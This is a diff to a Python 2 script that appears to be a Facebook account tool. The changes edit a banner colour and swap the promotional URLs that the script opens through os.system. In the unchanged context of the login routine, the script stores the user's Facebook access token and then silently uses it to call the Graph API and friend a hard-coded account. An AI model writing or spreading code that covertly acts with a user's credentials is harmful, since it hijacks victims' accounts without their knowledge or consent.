@@ -89,7 +89,7 @@ jalan("\033[1;97m•◈•───────•◈ NOT A NAME ITS BRAND •�
 
 jalan("\033[1;96m•◈•╭━━━┳╮╱╭┳╮╱╱╱╱╱╱╭╮ ")
 jalan("\033[1;96m•◈•┃╭━╮┃┃╱┃┃┃╱╱╱╱╱╱┃┃")
-jalan("\033[1;97m•◈•╰╯╭╯┃╰━╯┃┃╭━━┳━━┫┃╭╮ ")
+jalan("\033[1;96m•◈•╰╯╭╯┃╰━╯┃┃╭━━┳━━┫┃╭╮ ")
 jalan("\033[1;96m•◈•╭━╯╭┻━━╮┃┃┃╭╮┃╭━┫╰╯╯")
 jalan("\033[1;96m•◈•┃┃╰━╮╱╱┃┃╰┫╰╯┃╰━┫╭╮╮")
 jalan("\033[1;96m•◈•╰━━━╯╱╱╰┻━┻━━┻━━┻╯╰╯")
@@ -115,10 +115,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/red.team.offical')
+            os.system('xdg-open https://www.facebook.com/groups/red.team.offical/?ref=share')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/red.team.offical')
+        os.system('xdg-open https://www.facebook.com/groups/red.team.offical/?ref=share')
 
 def login():
 	os.system('clear')
@@ -162,7 +162,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.facebook.com/groups/red.team.offical/?ref=share')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
